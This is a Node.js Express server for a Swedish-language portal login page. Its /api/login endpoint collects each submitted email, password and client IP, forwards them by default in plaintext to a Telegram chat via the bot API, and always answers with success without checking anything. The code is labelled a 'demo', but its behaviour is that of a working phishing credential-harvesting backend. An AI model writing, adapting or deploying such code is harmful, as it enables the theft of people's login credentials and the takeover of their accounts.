require("dotenv").config();
const express = require("express");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

async function sendTelegram(text) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) {
    console.warn("[telegram] Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID");
    return { ok: false, error: "not_configured" };
  }
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    }),
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok || !data.ok) {
    console.error("[telegram]", data.description || res.statusText);
    return { ok: false, error: data.description || "request_failed" };
  }
  return { ok: true };
}

app.post("/api/login", async (req, res) => {
  const email = String(req.body.email || "").trim();
  const password = String(req.body.password || "");
  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    req.socket.remoteAddress ||
    "";

  if (!email || !password) {
    return res.status(400).json({ ok: false, message: "E-post och lösenord krävs." });
  }

  const when = new Date().toISOString();
  const omitPassword = process.env.TELEGRAM_EXCLUDE_PASSWORD === "true";

  let telegramBody = [
    "<b>Portal login attempt</b>",
    "",
    `<b>Email / username:</b> ${escapeHtml(email)}`,
    `<b>Time (UTC):</b> ${escapeHtml(when)}`,
  ];
  if (ip) telegramBody.push(`<b>IP:</b> ${escapeHtml(ip)}`);
  if (!omitPassword) {
    telegramBody.push("", `<b>Password:</b> ${escapeHtml(password)}`);
  } else {
    telegramBody.push("", "<i>Password omitted (TELEGRAM_EXCLUDE_PASSWORD=true).</i>");
  }

  const tg = await sendTelegram(telegramBody.join("\n"));

  // Demo: always “success” UI; plug your real auth here
  return res.json({
    ok: true,
    message: "Förfrågan har registrerats.",
    telegram: tg.ok ? "sent" : "failed_or_not_configured",
  });
});

function escapeHtml(s) {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

app.listen(PORT, () => {
  console.log(`Server http://localhost:${PORT}`);
});
